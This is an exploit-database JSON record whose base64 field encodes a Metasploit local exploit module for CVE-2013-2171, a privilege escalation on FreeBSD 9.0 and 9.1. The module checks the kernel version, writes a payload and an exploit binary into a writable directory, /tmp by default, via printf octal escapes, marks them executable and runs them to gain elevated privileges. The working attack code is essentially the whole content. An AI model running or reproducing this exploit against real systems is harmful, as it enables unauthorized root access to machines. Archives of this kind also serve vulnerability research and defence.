{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQ0IDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6UG9zdDo6Q29tbW9uDQogIGluY2x1ZGUgTXNmOjpQb3N0OjpGaWxlDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpGaWxlRHJvcHBlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm89e30pDQogICAgc3VwZXIoIHVwZGF0ZV9pbmZvKCBpbmZvLCB7DQogICAgICAgICdOYW1lJyAgICAgICAgICA9PiAnRnJlZUJTRCA5IEFkZHJlc3MgU3BhY2UgTWFuaXB1bGF0aW9uIFByaXZpbGVnZSBFc2NhbGF0aW9uJywNCiAgICAgICAgJ0Rlc2NyaXB0aW9uJyAgID0+ICVxew0KICAgICAgICAgIFRoaXMgbW9kdWxlIGV4cGxvaXRzIGEgdnVsbmVyYWJpbGl0eSB0aGF0IGNhbiBiZSB1c2VkIHRvIG1vZGlmeSBwb3J0aW9ucyBvZg0KICAgICAgICAgIGEgcHJvY2VzcydzIGFkZHJlc3Mgc3BhY2UsIHdoaWNoIG1heSBsZWFkIHRvIHByaXZpbGVnZSBlc2NhbGF0aW9uLiAgU3lzdGVtcw0KICAgICAgICAgIHN1Y2ggYXMgRnJlZUJTRCA5LjAgYW5kIDkuMSBhcmUga25vd24gdG8gYmUgdnVsbmVyYWJsZS4NCiAgICAgICAgfSwNCiAgICAgICAgJ0xpY2Vuc2UnICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgICAnQXV0aG9yJyAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICAnS29uc3RhbnRpbiBCZWxvdXNvdicsICAgIyBEaXNjb3ZlcnkNCiAgICAgICAgICAgICdBbGFuIENveCcsICAgICAgICAgICAgICAjIERpc2NvdmVyeQ0KICAgICAgICAgICAgJ0h1bmdlcicsICAgICAgICAgICAgICAgICMgUE9DDQogICAgICAgICAgICAnc2lubjNyJyAgICAgICAgICAgICAgICAgIyBNZXRhc3Bsb2l0DQogICAgICAgICAgXSwNCiAgICAgICAgJ1BsYXRmb3JtJyAgICAgID0+IFsgJ2JzZCcgXSwNCiAgICAgICAgJ0FyY2gnICAgICAgICAgID0+IFsgQVJDSF9YODYgXSwNCiAgICAgICAgJ1Nlc3Npb25UeXBlcycgID0+IFsgJ3NoZWxsJyBdLA0KICAgICAgICAnUmVmZXJlbmNlcycgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICBbICdDVkUnLCAnMjAxMy0yMTcxJyBdLA0KICAgICAgICAgICAgWyAnT1NWREInLCAnOTQ0MTQnIF0sDQogICAgICAgICAgICBbICdFREInLCAnMjYzNjgnIF0sDQogICAgICAgICAgICBbICdCSUQnLCAnNjA2MTUnIF0sDQogICAgICAgICAgICBbICdVUkwnLCAnaHR0cDovL3d3dy5mcmVlYnNkLm9yZy9zZWN1cml0eS9hZHZpc29yaWVzL0ZyZWVCU0QtU0EtMTM6MDYubW1hcC5hc2MnIF0NCiAgICAgICAgICBdLA0KICAgICAgICAnVGFyZ2V0cycgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICBbICdGcmVlQlNEIHg4NicsIHt9IF0NCiAgICAgICAgICBdLA0KICAgICAgICAnRGVmYXVsdFRhcmdldCcgPT4gMCwNCiAgICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiSnVuIDE4IDIwMTMiLA0KICAgICAgfQ0KICAgICkpDQogICAgcmVnaXN0ZXJfb3B0aW9ucyhbDQogICAgICAjIEl0IGlzbid0IE9wdFBhdGggYmVjdWFzZSBpdCdzIGEgKnJlbW90ZSogcGF0aA0KICAgICAgT3B0U3RyaW5nLm5ldygiV3JpdGFibGVEaXIiLCBbIHRydWUsICJBIGRpcmVjdG9yeSB3aGVyZSB3ZSBjYW4gd3JpdGUgZmlsZXMiLCAiL3RtcCIgXSksDQogICAgXSwgc2VsZi5jbGFzcykNCg0KICBlbmQNCg0KICBkZWYgY2hlY2sNCiAgICByZXMgPSBzZXNzaW9uLnNoZWxsX2NvbW1hbmRfdG9rZW4oInVuYW1lIC1hIikNCiAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpBcHBlYXJzIGlmIHJlcyA9fiAvRnJlZUJTRCA5XC5bMDFdLw0KDQogICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogIGVuZA0KDQogIGRlZiB3cml0ZV9maWxlKGZuYW1lLCBkYXRhKQ0KICAgIG9jdF9kYXRhID0gIlxcIiArIGRhdGEudW5wYWNrKCJDKiIpLmNvbGxlY3Qge3xlfCBlLnRvX3MoOCl9ICogIlxcIg0KICAgIHNlc3Npb24uc2hlbGxfY29tbWFuZF90b2tlbigicHJpbnRmIFwiI3tvY3RfZGF0YX1cIiA+ICN7Zm5hbWV9IikNCiAgICBzZXNzaW9uLnNoZWxsX2NvbW1hbmRfdG9rZW4oImNobW9kICt4ICN7Zm5hbWV9IikNCg0KICAgIGNoayA9IHNlc3Npb24uc2hlbGxfY29tbWFuZF90b2tlbigiZmlsZSAje2ZuYW1lfSIpDQogICAgcmV0dXJuIChjaGsgPX4gL0VSUk9SOiBjYW5ub3Qgb3Blbi8pID8gZmFsc2UgOiB0cnVlDQogIGVuZA0KDQoNCiAgZGVmIHVwbG9hZF9wYXlsb2FkDQogICAgZm5hbWUgPSBkYXRhc3RvcmVbJ1dyaXRhYmxlRGlyJ10NCiAgICBmbmFtZSA9ICIje2ZuYW1lfS8iIHVubGVzcyBmbmFtZSA9fiAlcicvJCcNCiAgICBpZiBmbmFtZS5sZW5ndGggPiAzNg0KICAgICAgZmFpbF93aXRoKEV4cGxvaXQ6OkZhaWx1cmU6OkJhZENvbmZpZywgIldyaXRhYmxlRGlyIGNhbid0IGJlIGxvbmdlciB0aGFuIDMzIGNoYXJhY3RlcnMiKQ0KICAgIGVuZA0KICAgIGZuYW1lID0gIiN7Zm5hbWV9I3tSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDQpfSINCg0KICAgIHAgPSBnZW5lcmF0ZV9wYXlsb2FkX2V4ZQ0KICAgIGYgPSB3cml0ZV9maWxlKGZuYW1lLCBwKQ0KICAgIHJldHVybiBuaWwgaWYgbm90IGYNCiAgICBmbmFtZQ0KICBlbmQNCg0KICBkZWYgZ2VuZXJhdGVfZXhwbG9pdChwYXlsb2FkX2ZuYW1lKQ0KICAgICMNCiAgICAjIE1ldGFzbSBkb2VzIG5vdCBzdXBwb3J0IEZyZWVCU0QgZXhlY3V0YWJsZSBnZW5lcmF0aW9uLg0KICAgICMNCiAgICBwYXRoID0gRmlsZS5qb2luKE1zZjo6Q29uZmlnLmluc3RhbGxfcm9vdCwgImRhdGEiLCAiZXhwbG9pdHMiLCAiQ1ZFLTIwMTMtMjE3MS5iaW4iKQ0KICAgIHggPSBGaWxlLm9wZW4ocGF0aCwgJ3JiJykgeyB8ZnwgZi5yZWFkKGYuc3RhdC5zaXplKSB9DQogICAgeC5nc3ViKC9NU0ZBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkwLywgcGF5bG9hZF9mbmFtZS5sanVzdCg0MCwgIlx4MDAiKSkNCiAgZW5kDQoNCiAgZGVmIHVwbG9hZF9leHBsb2l0KHBheWxvYWRfZm5hbWUpDQogICAgZm5hbWUgPSAiL3RtcC8je1JleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNCl9Ig0KICAgIGJpbiA9IGdlbmVyYXRlX2V4cGxvaXQocGF5bG9hZF9mbmFtZSkNCiAgICBmID0gd3JpdGVfZmlsZShmbmFtZSwgYmluKQ0KICAgIHJldHVybiBuaWwgaWYgbm90IGYNCiAgICBmbmFtZQ0KICBlbmQNCg0KICBkZWYgZXhwbG9pdA0KICAgIHBheWxvYWRfZm5hbWUgPSB1cGxvYWRfcGF5bG9hZA0KICAgIGZhaWxfd2l0aChFeHBsb2l0OjpGYWlsdXJlOjpOb3RGb3VuZCwgIlBheWxvYWQgZmFpbGVkIHRvIHVwbG9hZCIpIGlmIHBheWxvYWRfZm5hbWUubmlsPw0KICAgIHByaW50X3N0YXR1cygiUGF5bG9hZCAje3BheWxvYWRfZm5hbWV9IHVwbG9hZGVkLiIpDQoNCiAgICBleHBsb2l0X2ZuYW1lID0gdXBsb2FkX2V4cGxvaXQocGF5bG9hZF9mbmFtZSkNCiAgICBmYWlsX3dpdGgoRXhwbG9pdDo6RmFpbHVyZTo6Tm90Rm91bmQsICJFeHBsb2l0IGZhaWxlZCB0byB1cGxvYWQiKSBpZiBleHBsb2l0X2ZuYW1lLm5pbD8NCiAgICBwcmludF9zdGF0dXMoIkV4cGxvaXQgI3tleHBsb2l0X2ZuYW1lfSB1cGxvYWRlZC4iKQ0KDQogICAgcmVnaXN0ZXJfZmlsZXNfZm9yX2NsZWFudXAocGF5bG9hZF9mbmFtZSwgZXhwbG9pdF9mbmFtZSkNCg0KICAgIHByaW50X3N0YXR1cygiRXhlY3V0aW5nICN7ZXhwbG9pdF9mbmFtZX0iKQ0KICAgIGNtZF9leGVjKGV4cGxvaXRfZm5hbWUpDQogIGVuZA0KDQplbmQ=", 
    "filename": "platforms/freebsd/local/26454.rb", 
    "id": "26454", 
    "cves": [
        "CVE-2013-2171"
    ]
}